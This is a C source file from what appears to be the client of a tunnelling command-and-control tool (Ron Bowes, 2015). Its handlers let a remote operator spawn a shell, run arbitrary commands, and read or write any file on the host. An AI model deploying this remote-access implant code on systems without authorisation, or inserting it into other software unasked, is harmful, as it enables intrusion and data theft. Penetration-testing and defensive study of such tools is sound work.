/* commands_standard.c
 * By Ron Bowes
 * Created December, 2015
 *
 * See LICENSE.md
 *
 * Despite the name, this isn't realllly a header file. I moved some of
 * the functions into it to keep them better organized.
 */

static command_packet_t *handle_ping(driver_command_t *driver, command_packet_t *in)
{
  if(!in->is_request)
    return NULL;

  LOG_WARNING("Got a ping request! Responding!");
  return command_packet_create_ping_response(in->request_id, in->r.request.body.ping.data);
}

static command_packet_t *handle_shell(driver_command_t *driver, command_packet_t *in)
{
  session_t *session = NULL;

  if(!in->is_request)
    return NULL;

#ifdef WIN32
  session = session_create_exec(driver->group, "cmd.exe", "cmd.exe");
#else
  session = session_create_exec(driver->group, "sh", "sh");
#endif
  controller_add_session(session);

  return command_packet_create_shell_response(in->request_id, session->id);
}

static command_packet_t *handle_exec(driver_command_t *driver, command_packet_t *in)
{
  session_t *session = NULL;

  if(!in->is_request)
    return NULL;

  session = session_create_exec(driver->group, in->r.request.body.exec.name, in->r.request.body.exec.command);
  controller_add_session(session);

  return command_packet_create_exec_response(in->request_id, session->id);
}

static command_packet_t *handle_download(driver_command_t *driver, command_packet_t *in)
{
  struct stat s;
  uint8_t *data;
  FILE *f = NULL;
  command_packet_t *out = NULL;

  if(!in->is_request)
    return NULL;

  if(stat(in->r.request.body.download.filename, &s) != 0)
    return command_packet_create_error_response(in->request_id, -1, "Error opening file for reading");

#ifdef WIN32
  fopen_s(&f, in->r.request.body.download.filename, "rb");
#else
  f = fopen(in->r.request.body.download.filename, "rb");
#endif
  if(!f)
    return command_packet_create_error_response(in->request_id, -1, "Error opening file for reading");

  data = safe_malloc(s.st_size);
  if(fread(data, 1, s.st_size, f) == s.st_size)
    out = command_packet_create_download_response(in->request_id, data, s.st_size);
  else
    out = command_packet_create_error_response(in->request_id, -1, "There was an error reading the file");

  fclose(f);
  safe_free(data);

  return out;
}

static command_packet_t *handle_upload(driver_command_t *driver, command_packet_t *in)
{
  FILE *f;

  if(!in->is_request)
    return NULL;

#ifdef WIN32
  fopen_s(&f, in->r.request.body.upload.filename, "wb");
#else
  f = fopen(in->r.request.body.upload.filename, "wb");
#endif

  if(!f)
    return command_packet_create_error_response(in->request_id, -1, "Error opening file for writing");

  fwrite(in->r.request.body.upload.data, in->r.request.body.upload.length, 1, f);
  fclose(f);

  return command_packet_create_upload_response(in->request_id);
}

static command_packet_t *handle_shutdown(driver_command_t *driver, command_packet_t *in)
{
  if(!in->is_request)
    return NULL;

  controller_kill_all_sessions();

  return command_packet_create_shutdown_response(in->request_id);
}

static command_packet_t *handle_error(driver_command_t *driver, command_packet_t *in)
{
  if(!in->is_request)
    LOG_ERROR("An error response was returned: %d -> %s", in->r.response.body.error.status, in->r.response.body.error.reason);
  else
    LOG_ERROR("An error request was sent (weird?): %d -> %s", in->r.request.body.error.status, in->r.request.body.error.reason);

  return NULL;
}
